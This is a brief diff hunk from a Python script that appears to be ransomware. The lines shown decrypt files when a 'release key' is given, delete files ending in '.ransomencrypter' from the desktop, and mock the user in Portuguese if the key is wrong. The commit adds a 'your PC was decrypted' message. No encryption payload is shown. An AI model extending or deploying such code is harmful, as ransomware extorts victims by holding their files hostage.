@@ -74,5 +74,6 @@ if __name__ == '__main__':
             descrypt(key)
             for del_file in glob.glob('*.ransomencrypter'):
                 os.remove(f'{desktop}\\{del_file}')
+            print('seu pc foi descriptografado')
         else:
             print('Chave de liberação inválida, que pena ;(')
